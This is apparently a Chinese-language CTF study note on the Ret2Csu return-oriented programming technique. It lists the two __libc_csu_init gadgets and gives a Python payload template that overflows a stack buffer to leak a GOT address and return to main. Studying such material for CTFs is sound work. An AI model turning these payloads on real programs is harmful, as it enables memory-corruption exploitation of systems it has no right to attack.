# Pwn 进阶笔记：Ret2Csu（利用 __libc_csu_init 万能 Gadget）

## 一、 核心思想与背景
- **核心思想**：在 64 位程序中，参数需要靠寄存器（rdi, rsi, rdx）传递。如果出题人把程序里的 `pop rdi; ret` 等干净的传参 Gadget 全删了，我们就去程序的初始化函数 `__libc_csu_init` 里“借用”编译器自带的代码片段，通过控制 6 个寄存器来间接完成传参和函数调用。
- **适用条件**：仅限 64 位程序；程序里必须有 `__libc_csu_init` 函数（如果是高版本 GCC 开启了 O2 优化，这个函数可能被精简或消失，需要先找一下）。

## 二、 底层原理（两大核心 Gadget）
定位 `__libc_csu_init` 函数，里面藏着两段核心代码：

**1. Gadget 1（设置参数组）：**
```assembly
pop rbx
pop rbp
pop r12
pop r13
pop r14
pop r15
ret
```
*这段指令用来从栈上弹出数据，填进寄存器。*

**2. Gadget 2（执行调用组）：**
```assembly
mov rdx, r14
mov rsi, r13
mov edi, r12d
call qword ptr [r15+rbx*8]
```
*这段指令利用上一组设置好的寄存器，完成传参并调用函数。注意它是间接调用（加了中括号）。*

## 三、 Payload 构造模板
假设要调用 `write(1, got_addr, 8)` 泄露地址，Payload 结构如下：

```python
csu_pop = 0x4006FA  # Gadget 1 的地址 (pop rbx...)
csu_call = 0x4006E0 # Gadget 2 的地址 (mov rdx...)

payload  = b'A' * offset

# ---------- 第一段：去 csu_pop 设置寄存器 ----------
payload += p64(csu_pop)
payload += p64(0)               # rbx = 0 (必须为 0)
payload += p64(1)               # rbp = 1 (必须为 1，防止死循环)
payload += p64(1)               # r12 -> edi (参数1：fd = 1)
payload += p64(elf.got['write']) # r13 -> rsi (参数2：打印的地址)
payload += p64(8)               # r14 -> rdx (参数3：打印长度)
payload += p64(elf.got['write']) # r15 -> 存放函数地址的指针 (call [r15+rbx*8])

# ---------- 第二段：去 csu_call 执行函数 ----------
payload += p64(csu_call)

# ---------- 第三段：吃掉 7 个致命垃圾 ----------
# call 执行完后会掉回 Gadget 1，执行 add rsp, 8 和 6 个 pop
payload += p64(0) # add rsp, 8 的垃圾
payload += p64(0) # pop rbx
payload += p64(0) # pop rbp
payload += p64(0) # pop r12
payload += p64(0) # pop r13
payload += p64(0) # pop r14
payload += p64(0) # pop r15

# ---------- 第四段：真正的返回地址 ----------
payload += p64(main_addr) # 执行完 write 后，回到 main 重新开局
```

## 四、 常见踩坑点
1. **`r15` 填的不是地址，是指针**：因为 `call [r15+rbx*8]` 是间接调用，`r15` 必须填存有函数真实地址的内存的地址（比如 GOT 表地址），不能直接填 PLT 地址。
2. **`rbx` 和 `rbp` 的值**：`rbx` 必须为 0（否则 `[r15+rbx*8]` 会偏移错位），`rbp` 必须为 1（与自增后的 rbx 比较，确保只执行一次就跳出循环）。
3. **清理那 7 个垃圾**：这是新手最容易漏掉的，如果没有垫这 7 个 QWORD，程序就会把接下来的地址当成垃圾弹掉，导致栈错位崩溃。
4. **调用非 GOT 函数（如 system）**：如果要调 `system`（不在 GOT 表里），你需要先用 `read` 把 `system` 的地址写到 `.bss` 段，然后把 `r15` 填成那个 `.bss` 段地址。

## 五、 与其他技术的对比
- **Ret2Libc**：解决“没有后门函数”的问题。
- **Ret2dlresolve**：解决“没有函数真实地址”的问题。
- **Ret2Csu**：解决“没有传参指令”的问题（常作为前面的补丁，后接 Libc 或 Syscall）。